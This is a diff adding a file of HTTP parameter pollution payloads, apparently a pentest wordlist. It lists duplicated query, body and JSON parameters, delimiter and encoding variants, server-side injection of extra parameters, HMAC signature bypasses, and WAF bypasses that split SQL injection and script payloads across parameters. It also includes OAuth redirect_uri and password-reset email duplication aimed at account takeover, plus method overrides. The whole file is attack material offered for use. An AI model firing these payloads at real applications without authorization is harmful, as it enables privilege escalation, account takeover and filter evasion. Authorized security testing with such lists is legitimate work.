@@ -1,0 +1,117 @@
+# HTTP Parameter Pollution Payloads
+# Query, body and URL fragments. Replace parameter names with ones the target accepts.
+
+# Duplicate parameter, benign value first
+?id=1&id=2
+?id=1&id=2&id=3
+?user=alice&user=bob
+?role=user&role=admin
+?amount=10&amount=1
+?price=100&price=0
+?email=victim@example.test&email=attacker@example.test
+?redirect=https://app.example.test/&redirect=https://oast.example.test/
+?callback=safe&callback=alert
+
+# Duplicate parameter, test value first
+?id=2&id=1
+?role=admin&role=user
+?email=attacker@example.test&email=victim@example.test
+
+# Array and bracket notation
+?id[0]=1&id[1]=2
+?id[]=1
+?user[role]=admin
+?user[]=alice&user[]=bob
+?filter[owner]=alice&filter[owner]=bob
+?id=1&id[]=2
+?id[a]=1
+
+# Delimiter variants
+?id=1;id=2
+?id=1,2
+?id=1%26id=2
+?id=1%2Cid=2
+?id=1&id%00=2
+?id=1&ID=2
+?id=1&Id=2
+?id=1&id =2
+?id=1&%69d=2
+?id=1&id%5b%5d=2
+
+# Parameters in both URL and body (send POST with the duplicate in the body)
+POST /action?id=1  body: id=2
+POST /action?role=user  body: role=admin
+POST /action?amount=1  body: amount=1000
+
+# Content-type variations with the same duplicate
+Content-Type: application/x-www-form-urlencoded  body: id=1&id=2
+Content-Type: application/json  body: {"id":1,"id":2}
+Content-Type: application/json  body: {"id":"1","id":"2","ID":"3"}
+Content-Type: multipart/form-data  (two parts named "id" with different values)
+Content-Type: application/xml  body: <r><id>1</id><id>2</id></r>
+
+# JSON duplicate-key tests (parsers disagree on first or last wins)
+{"role":"user","role":"admin"}
+{"role":"admin","role":"user"}
+{"user":{"id":1,"id":2}}
+{"id":1,"id":[2]}
+{"amount":10,"amount":-10}
+
+# Server-side parameter pollution: injected delimiters in a value forwarded to an internal API
+name=alice%26role=admin
+name=alice%26admin=true
+name=alice%23
+name=alice%23foo
+name=alice%26role=admin%23
+name=alice%26field=password
+name=alice%26field=email%23
+name=alice%26internal=true
+name=alice%3Bfield=x
+username=administrator%26x=y
+username=administrator%23
+username=../admin
+username=alice%2f..%2fadmin
+search=term%26limit=1000000
+search=term%26format=csv
+
+# Truncation and override of a trailing server-controlled parameter
+value=test%26publicProfile=false%23
+value=test%23&publicProfile=true
+value=test%26access_token=
+
+# Signed request and HMAC bypass (parameter order and duplicates change what is signed)
+?a=1&b=2&sig=VALID_SIG&b=3
+?b=3&a=1&sig=VALID_SIG
+?a=1&a=2&sig=VALID_SIG
+?sig=VALID_SIG&a=1
+
+# WAF bypass pattern: split a payload across duplicated parameters (ASP.NET concatenates with commas)
+?q=1'&q=OR&q=1=1--
+?q=<script>&q=alert(1)&q=</script>
+?q=1/*&q=*/UNION/*&q=*/SELECT/*&q=*/1
+
+# Cross-site HPP: inject a parameter into a link or form the application builds
+?param=value%26action=delete
+?lang=en%26admin=1
+?return=%2Fhome%3Fcsrf_token=
+?next=/path%26extra=1
+
+# OAuth / OIDC duplication
+?client_id=TEST_CLIENT&client_id=OTHER_CLIENT
+?redirect_uri=https://app.example.test/cb&redirect_uri=https://oast.example.test/cb
+?scope=profile&scope=admin
+?state=a&state=b
+?response_type=code&response_type=token
+
+# Authentication / password reset duplication
+email=victim@example.test&email=attacker@example.test
+email=victim@example.test%26email=attacker@example.test
+email[]=victim@example.test&email[]=attacker@example.test
+user_id=1&user_id=2
+token=VALID_TOKEN&token=OTHER_TOKEN
+
+# Method override combined with duplication
+?_method=PUT&_method=GET
+?_method=DELETE
+X-HTTP-Method-Override: PUT
+X-Method-Override: DELETE
